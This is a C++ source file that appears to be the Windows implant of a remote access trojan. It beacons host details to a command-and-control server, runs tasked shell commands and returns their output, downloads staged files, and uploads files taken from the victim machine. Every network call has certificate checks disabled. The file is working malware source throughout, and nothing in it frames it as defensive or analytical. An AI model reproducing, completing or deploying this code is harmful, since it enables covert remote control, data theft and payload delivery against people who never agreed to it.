#include <iostream>
#include <Windows.h>
#include <string>

#include <cctype> // URL encoding
#include <iomanip> // URL encoding
#include <sstream> // URL encoding

#include <Psapi.h> // GetModuleBaseName()
#include <Shlwapi.h> // PathFileExists()
#include <urlmon.h> // URLDownloadToFile()
#include <vector>

#include "stdafx.h"	// WinHttpClient
#include "WinHttpClient.h" // WinHttpClient

#include <fstream> // To get file contents

using namespace std;

#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Urlmon.lib")


// Gets the current proccess' filename
// Returns "ProcessFilename" wstring
wstring GetProcessFilename()
{
	HANDLE hProcess = GetCurrentProcess(); // Gets handle to current process

	wchar_t Filename[MAX_PATH]; // 260 characters
	GetModuleBaseName(hProcess, NULL, Filename, MAX_PATH); // Returns just the process filename from the handle

	wstring ProcessFilename = Filename; // Convert to wstring
	return ProcessFilename;
}
// End of GetProcessFileName() function


// Gets the system hostname
// Returns "Hostname" wstring
wstring GetHostname()
{
	wchar_t Buffer[MAX_COMPUTERNAME_LENGTH + 1]; // MAX_COMPUTERNAME_LENGTH + 1 per MSDN
	DWORD Size;
	GetComputerName(Buffer, &Size); // Gets the NetBIOS name of the local computer

	wstring Hostname = Buffer; // Converts to wstring
	return Hostname;
}
// End of GetHostname() function


// Gets the system OS for x86 systems
// Returns "OperatingSystem" wstring
wstring Get32BitOS()
{
	HKEY hRegistry = NULL;
	RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", &hRegistry); // Opens a handle to the Registry

	DWORD Size;
	RegQueryValueEx(hRegistry, L"ProductName", NULL, NULL, NULL, &Size); // Queries the size (in bytes) for the "ProductName" Registry key - Will save size (in bytes) including null-terminator in "size" DWORD

	wchar_t Buffer[256];
	RegQueryValueEx(hRegistry, L"ProductName", NULL, NULL, (LPBYTE)&Buffer, &Size); // Queries the "ProductName" Registry key and stores output in buffer

	RegCloseKey(hRegistry); // Closes the Registry handle

	wstring OperatingSystem = Buffer; // Converts to wstring
	return OperatingSystem;
}
// End of Get32BitOS() function


// Gets the system OS for x64 systems
// Returns "OperatingSystem" wstring
wstring Get64BitOS()
{
	HKEY hRegistry = NULL;
	RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion", &hRegistry); // Opens a handle to the Registry

	DWORD Size;
	RegQueryValueEx(hRegistry, L"ProductName", NULL, NULL, NULL, &Size); // Queries the size (in bytes) for the "ProductName" Registry key - Will save size (in bytes) including null-terminator in "size" DWORD

	wchar_t Buffer[256];
	RegQueryValueEx(hRegistry, L"ProductName", NULL, NULL, (LPBYTE)&Buffer, &Size); // Queries the "ProductName" Registry key and stores output in buffer

	RegCloseKey(hRegistry); // Closes the Registry handle

	wstring OperatingSystem = Buffer; // Converts to wstring
	return OperatingSystem;
}
// End of Get64BitOS() function


// Gets the system architecture - DOES NOT TAKE INTO ACCOUNT NON C: SYSTEM DRIVES (IE: OTHER DRIVE LETTERS)
// Returns "Architecture" wstring
wstring GetArchitecture()
{
	wstring Architecture;
	BOOL Exists = PathFileExists(L"C:\\Windows\\SysWOW64"); // Determines if C:\Windows\SysWOW64 directory exists

	if (Exists == TRUE) // If true then the system architecture is x64
		Architecture = L"x64";
	else // Else the system architecture is x86
		Architecture = L"x86";

	return Architecture;
}
// End of GetArchitecture() function


// Obtained from http://stackoverflow.com/questions/36774547/httpsendrequest-post-data-not-supporting-unicode
// Used to convert POST data from UTF-16 (wstring) to UTF-8 (string)
// Returns UTF-8 "Output" string
string UTF8Encode(const wstring &PostData)
{
	string Output;
	int len = WideCharToMultiByte(CP_UTF8, 0, PostData.c_str(), PostData.length(), NULL, 0, NULL, NULL);
	if (len > 0)
	{
		Output.resize(len);
		WideCharToMultiByte(CP_UTF8, 0, PostData.c_str(), PostData.length(), &Output[0], len, NULL, NULL);
	}
	return Output; // Returns UTF-8 string to the calling function
}
// End of UTF8Encode() function


// Code obtained from http://stackoverflow.com/questions/154536/encode-decode-urls-in-c
// Returns URL-encded string "Escaped"
string URLEncode(const string &Value)
{
	ostringstream Escaped;
	Escaped.fill('0');
	Escaped << hex;

	for (string::const_iterator i = Value.begin(), n = Value.end(); i != n; ++i)
	{
		string::value_type c = (*i);

		// Keep alphanumeric and other accepted characters intact
		if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
			Escaped << c;
			continue;
		}

		// Any other characters are percent-encoded
		Escaped << uppercase;
		Escaped << '%' << setw(2) << int((unsigned char)c);
		Escaped << nouppercase;
	}

	return Escaped.str();
}
// End of URLEncode() function


// Beacons to the specified C2 server
// Returns "Response" wstring
wstring Beacon(const wstring &BeaconURL, const wstring &UserAgent)
{
	WinHttpClient Beacon(BeaconURL);
	Beacon.SetUserAgent(UserAgent);
	//Beacon.SetProxy(L"127.0.0.1:9999");	// DEBUGGING - REMOVE LATER

	Beacon.SetRequireValidSslCertificates(false); // Accept any SSL certificate

	string PostData;

	if (GetArchitecture() == L"x86") // If system architecture is x86 so we need to call the 32-bit version of getOS()
		PostData = "hostname=" + URLEncode(UTF8Encode(GetHostname())) + "&os=" + URLEncode(UTF8Encode(Get32BitOS())) + "&architecture=" + UTF8Encode(GetArchitecture()) + "&pid=" + to_string(GetCurrentProcessId()) + "&pfilename=" + URLEncode(UTF8Encode(GetProcessFilename())); // POST data
	else // Else system architecture is x64 so we need to call the 64-bit version of getOS()
		PostData = "hostname=" + URLEncode(UTF8Encode(GetHostname())) + "&os=" + URLEncode(UTF8Encode(Get64BitOS())) + "&architecture=" + UTF8Encode(GetArchitecture()) + "&pid=" + to_string(GetCurrentProcessId()) + "&pfilename=" + URLEncode(UTF8Encode(GetProcessFilename())); // POST data

	Beacon.SetAdditionalDataToSend((BYTE *)PostData.c_str(), PostData.size());
	wstring ContentLength = to_wstring(PostData.length()); // We need to create new wstring for the "Content-Length" so we can append to the other headers

	wstring Headers = L"Content-Length: ";
	Headers += ContentLength;
	Headers += L"\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\n";
	Beacon.SetAdditionalRequestHeaders(Headers); // Appends headers above

	Beacon.SendHttpRequest(L"POST"); // Sends the POST request

	wstring Response = Beacon.GetResponseContent(); // Gets POST respone and stores in "response" wstring

	return Response;
}
// End of Beacon() function


// Code modified from http://blog.mrroa.com/2013/06/06/tiptrick-how-to-retrieve-a-sub-string-between-two-delimiters-using-c/
// Extracts task information
// IE: Calling ExtractString(BeaconResponse, L"<id>", L"</id>"); will return the task ID
// Returns "Stripped" wstring
wstring ExtractString(const wstring Source, const wstring Start, const wstring End)
{
	wstring EmptyString;
	size_t StartIndex = Source.find(Start);

	// If the starting delimiter is not found - Exits function
	if (StartIndex == string::npos)
		return EmptyString;

	// Adds the length of the delimiter to our starting index
	// This will move us to the beginning of our substring.
	StartIndex += Start.length();

	// Looks for the end delimiter
	wstring::size_type EndIndex = Source.find(End, StartIndex);

	// Returns the substring between the start index and the end index
	wstring Stripped = Source.substr(StartIndex, EndIndex - StartIndex);
	return Stripped;
}

// End of ExtractString() function


// Code modified from http://www.cplusplus.com/forum/unices/28134/
// Runs the tasked command usng popen() and gets the output
// Returns "output" wstring
wstring ExecuteCommand(const wstring &Secondary)
{
	wstring Temp = L" 2>&1"; // Necessary to redirect Standard Error to Standard Output
	wstring Command = Secondary.data() + Temp; // Janky but this is necessary

	wchar_t Buffer[256];
	wstring Output;

	FILE* pipe = _wpopen(Command.data(), L"r");

	while (!feof(pipe))
	{
		if (fgetws(Buffer, 256, pipe) != NULL)
		{
			Output += Buffer;
		}

	}

	_pclose(pipe); // Closes pipe

	return Output;
}
// End of ExecuteCommand() function


// Updates task output to the specified C2 server
// Doesn't return anything
void CommandUpdate(const wstring &UpdateURL, const wstring &UserAgent, const wstring &CommandOutput, const wstring &Id, const wstring &Action, const wstring &Secondary)
{
	WinHttpClient Update(UpdateURL);
	Update.SetUserAgent(UserAgent);
	//Update.SetProxy(L"127.0.0.1:9999");	// DEBUGGING - REMOVE LATER

	Update.SetRequireValidSslCertificates(false); // Accept any SSL certificate

	string PostData;

	if (GetArchitecture() == L"x86") // If system architecture is x86 so we need to call the 32-bit version of getOS()
		PostData = "hostname=" + URLEncode(UTF8Encode(GetHostname())) + "&os=" + URLEncode(UTF8Encode(Get32BitOS())) + "&architecture=" + UTF8Encode(GetArchitecture()) + "&id=" + UTF8Encode(Id) + "&action=" + UTF8Encode(Action) + "&secondary=" + URLEncode(UTF8Encode(Secondary)) + "&output=" + URLEncode(UTF8Encode(CommandOutput)); // POST data
	else // Else system architecture is x64 so we need to call the 64-bit version of getOS()
		PostData = "hostname=" + URLEncode(UTF8Encode(GetHostname())) + "&os=" + URLEncode(UTF8Encode(Get64BitOS())) + "&architecture=" + UTF8Encode(GetArchitecture()) + "&id=" + UTF8Encode(Id) + "&action=" + UTF8Encode(Action) + "&secondary=" + URLEncode(UTF8Encode(Secondary)) + +"&output=" + URLEncode(UTF8Encode(CommandOutput)); // POST data

	Update.SetAdditionalDataToSend((BYTE *)PostData.c_str(), PostData.size());
	wstring ContentLength = to_wstring(PostData.length()); // We need to create new wstring for the "Content-Length" so we can append to the other headers

	wstring Headers = L"Content-Length: ";
	Headers += ContentLength;
	Headers += L"\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\n";
	Update.SetAdditionalRequestHeaders(Headers); // Appends headers above

	Update.SendHttpRequest(L"POST"); // Sends the POST request
}
// End of Update() function


// Downloads the file that the RAT user uploaded to the C2 server
// Does not return anything
void DownloadFile(const wstring &Protocol, const wstring &Ip, const wstring &Secondary, const wstring &DownloadPath, const wstring &DownloadFilename)
{
	wstring DownloadURL = Protocol + L"://" + Ip + Secondary;

	WinHttpClient DownloadRequest(DownloadURL);

	DownloadRequest.SetRequireValidSslCertificates(false); // Accept any SSL certificate

	DownloadRequest.SendHttpRequest();

	wstring FullPath = DownloadPath + L"/" + DownloadFilename; // Uses staging directory described in "config.h" to create full path to save the file (including filename)

	DownloadRequest.SaveResponseToFile(FullPath); // Saves to staging directory
}
// End of DownloadFile() function


// Code modified from http://cboard.cprogramming.com/cplusplus-programming/102876-vector-substrings-2.html
// Takes a Windows path and returns just the filename
wstring GetFilename(const wstring& Text, wchar_t Delimiter)
{
	vector<wstring> Result;

	wstring::size_type Start = 0;
	wstring::size_type End = Text.find(Delimiter, Start);

	while (End != wstring::npos)
	{
		wstring Token = Text.substr(Start, End - Start);

		Result.push_back(Token);

		Start = End + 1;
		End = Text.find(Delimiter, Start);
	}

	Result.push_back(Text.substr(Start));

	wstring Filename = Result[Result.size() - 1];

	return Filename; // Returns just the filename
}
// End of GetFilename() function


// Generic update to the C2 server
// Does not return anything
void Update(const wstring &UpdateURL, const wstring &UserAgent, const wstring &Id, const wstring &Action, const wstring &Secondary)
{
	WinHttpClient Update(UpdateURL);
	Update.SetUserAgent(UserAgent);
	//Update.SetProxy(L"127.0.0.1:9999");	// DEBUGGING - REMOVE LATER

	Update.SetRequireValidSslCertificates(false); // Accept any SSL certificate

	string PostData;

	if (GetArchitecture() == L"x86") // If system architecture is x86 so we need to call the 32-bit version of getOS()
		PostData = "hostname=" + URLEncode(UTF8Encode(GetHostname())) + "&os=" + URLEncode(UTF8Encode(Get32BitOS())) + "&architecture=" + UTF8Encode(GetArchitecture()) + "&id=" + UTF8Encode(Id) + "&action=" + UTF8Encode(Action) + "&secondary=" + URLEncode(UTF8Encode(Secondary)); // POST data
	else // Else system architecture is x64 so we need to call the 64-bit version of getOS()
		PostData = "hostname=" + URLEncode(UTF8Encode(GetHostname())) + "&os=" + URLEncode(UTF8Encode(Get64BitOS())) + "&architecture=" + UTF8Encode(GetArchitecture()) + "&id=" + UTF8Encode(Id) + "&action=" + UTF8Encode(Action) + "&secondary=" + URLEncode(UTF8Encode(Secondary)); // POST data

	Update.SetAdditionalDataToSend((BYTE *)PostData.c_str(), PostData.size());
	wstring ContentLength = to_wstring(PostData.length()); // We need to create new wstring for the "Content-Length" so we can append to the other headers

	wstring Headers = L"Content-Length: ";
	Headers += ContentLength;
	Headers += L"\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\n";
	Update.SetAdditionalRequestHeaders(Headers); // Appends headers above

	Update.SendHttpRequest(L"POST"); // Sends the POST request

}
// End of Update() function


// Code modified from http://insanecoding.blogspot.com/2011/11/how-to-read-in-file-in-c.html
// Returns string that contains file output
string GetContents(const string &Filename, const wstring &Secondary)
{
	BOOL exists = FALSE;
	exists = PathFileExists(Secondary.c_str());
	string Contents;

	if (exists == TRUE) // If file actually exists on the implanted system
	{ 
		FILE *Fp;
		fopen_s(&Fp, Filename.c_str(), "rb");

		fseek(Fp, 0, SEEK_END);
		Contents.resize(ftell(Fp));
		rewind(Fp);
		fread(&Contents[0], 1, Contents.size(), Fp);
		fclose(Fp);
	}

	return Contents;
}
// End of GetContents() function


// Uploads remote from the implanted system to the C2 server
// Does not return anything
void UploadFile(const wstring &Protocol, const wstring &Ip, const wstring &Id, const wstring &Action, const wstring &Secondary, const wstring &UpdateFile, const wstring &PostBoundary, const wstring &UserAgent)
{
	wstring Filename = GetFilename(Secondary, '\\'); // Gets just the filename - Backslash because it's a Windows path

	wstring URL = Protocol + L"://" + Ip + L"/" + UpdateFile;

	WinHttpClient Update(URL);
	Update.SetUserAgent(UserAgent);
	//Update.SetProxy(L"127.0.0.1:9999");	// DEBUGGING - REMOVE LATER

	Update.SetRequireValidSslCertificates(false); // Accept any SSL certificate

	string PostData = "--" + UTF8Encode(PostBoundary) + "\r\n";
	PostData += "Content-Disposition: form-data; name=hostname\r\n\r\n"; // Hostname
	PostData += UTF8Encode(GetHostname()) + "\r\n";
	PostData += "--" + UTF8Encode(PostBoundary) + "\r\n";

	PostData += "Content-Disposition: form-data; name=id\r\n\r\n"; // ID
	PostData += UTF8Encode(Id) + "\r\n";
	PostData += "--" + UTF8Encode(PostBoundary) + "\r\n";

	PostData += "Content-Disposition: form-data; name=action\r\n\r\n"; // Action
	PostData += UTF8Encode(Action) + "\r\n";
	PostData += "--" + UTF8Encode(PostBoundary) + "\r\n";

	PostData += "Content-Disposition: form-data; name=secondary\r\n\r\n"; // Action
	PostData += UTF8Encode(Secondary) + "\r\n";
	PostData += "--" + UTF8Encode(PostBoundary) + "\r\n";

	PostData += "Content-Disposition: form-data; name=download; filename=" + UTF8Encode(Filename) + "\r\n\r\n"; // File
	PostData += GetContents(UTF8Encode(Secondary.c_str()), Secondary) + "\r\n"; //
	PostData += "--" + UTF8Encode(PostBoundary) + "\r\n";

	Update.SetAdditionalDataToSend((BYTE *)PostData.c_str(), PostData.size());
	wstring ContentLength = to_wstring(PostData.length()); // We need to create new wstring for the "Content-Length" so we can append to the other headers

	wstring Headers = L"Content-Length: ";
	Headers += ContentLength;
	Headers += L"\r\nContent-Type: multipart/form-data; boundary=" + PostBoundary + L"\r\n";
	Update.SetAdditionalRequestHeaders(Headers); // Appends headers above

	Update.SendHttpRequest(L"POST"); // Sends the POST request
}
// End of UploadFile() function